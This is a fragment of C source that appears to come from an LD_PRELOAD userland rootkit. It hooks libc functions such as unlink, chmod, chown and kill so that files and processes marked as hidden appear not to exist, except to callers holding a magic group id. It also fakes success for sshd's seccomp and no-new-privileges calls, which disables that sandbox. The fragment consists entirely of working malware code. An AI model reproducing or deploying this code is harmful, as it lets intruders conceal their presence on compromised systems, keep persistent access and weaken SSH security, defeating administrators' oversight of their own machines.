	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_UNLINKAT, dirfd, path, flags);
}

int unlink(const char *path)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_UNLINK, path);
}

int creat(const char *path, mode_t mode)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_CREAT, path, mode);
}

int chmod(const char *path, mode_t mode)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_CHMOD, path, mode);
}

int chown(const char *path, uid_t owner, gid_t group)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_CHOWN, path, owner, group);
}

int fchownat(int dirfd, const char *path, uid_t owner, gid_t group, int flags)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;
	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_FCHOWNAT, dirfd, path, owner, group, flags);
}

int kill(pid_t pid, int sig)
{
	char proc[256];

	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	sprintf(proc, "/proc/%d", pid);
	if (hidden_stat(proc)) {
		errno = ESRCH;
		return -1;
	}
out:
	return syscall(SYS_KILL, pid, sig);
}

#ifndef __FreeBSD__
#define PR_SET_NO_NEW_PRIVS 38
#define PR_SET_SECCOMP      22
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
	LIBC_HOOK(prctl, "prctl");
	if (strcmp(__progname, "sshd"))
			goto out;
	if (option == PR_SET_NO_NEW_PRIVS)
		return 0;
	if (option == PR_SET_SECCOMP)
		return 0;
out:
	return libc_syms.prctl(option, arg2, arg3, arg4, arg5);
}
#endif